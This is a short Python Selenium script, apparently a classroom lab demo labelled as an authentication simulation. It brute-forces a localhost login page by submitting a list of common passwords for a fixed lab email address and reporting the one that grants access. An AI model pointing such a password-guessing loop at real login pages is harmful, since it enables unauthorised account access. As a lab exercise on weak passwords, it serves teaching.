from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
import time

VERDE = "\033[92m"
VERMELHO = "\033[91m"
AZUL = "\033[94m"
AMARELO = "\033[93m"
CIANO = "\033[96m"
RESET = "\033[0m"

EMAIL = "aluna@laboratorio.local"

URL = "http://127.0.0.1:8000/login.html"

senhas = [
    "123456",
    "admin",
    "senha123",
    "minecraft",
    "python",
    "12345678",
    "qwerty",
    "programacao",
    "python123",
    "admin123"
]

print()
print(f"{CIANO}======================================{RESET}")
print(f"{CIANO}       SIMULAÇÃO DE AUTENTICAÇÃO{RESET}")
print(f"{CIANO}======================================{RESET}")
print()

opcoes = Options()

navegador = webdriver.Chrome(options=opcoes)

print(f"{AZUL}[INFO]{RESET} Abrindo navegador...")
navegador.get(URL)

time.sleep(2)

print(f"{AZUL}[INFO]{RESET} Página de login carregada.")
print(f"{AZUL}[INFO]{RESET} E-mail: {EMAIL}")
print()

for senha in senhas:

    campo_email = navegador.find_element(
        By.ID,
        "email"
    )

    campo_senha = navegador.find_element(
        By.ID,
        "senha"
    )

    campo_email.clear()
    campo_senha.clear()

    campo_email.send_keys(EMAIL)
    campo_senha.send_keys(senha)

    print(
        f"{AMARELO}[TESTE]{RESET} "
        f"Tentando: {senha}"
    )

    botao = navegador.find_element(
        By.TAG_NAME,
        "button"
    )

    botao.click()

    time.sleep(0.7)

    mensagem = navegador.find_element(
        By.ID,
        "mensagem"
    ).text

    if mensagem == "Acesso concedido!":

        print()
        print(
            f"{VERDE}██████████████████████████████{RESET}"
        )

        print(
            f"{VERDE}[ACESSO CONCEDIDO]{RESET}"
        )

        print(
            f"{VERDE}Senha encontrada: {senha}{RESET}"
        )

        print(
            f"{VERDE}██████████████████████████████{RESET}"
        )

        break

    else:

        print(
            f"{VERMELHO}[NEGADO]{RESET} {senha}"
        )

    time.sleep(0.5)

else:

    print()

    print(
        f"{VERMELHO}[FALHA]{RESET} "
        f"Senha não encontrada."
    )

time.sleep(3)

navegador.quit()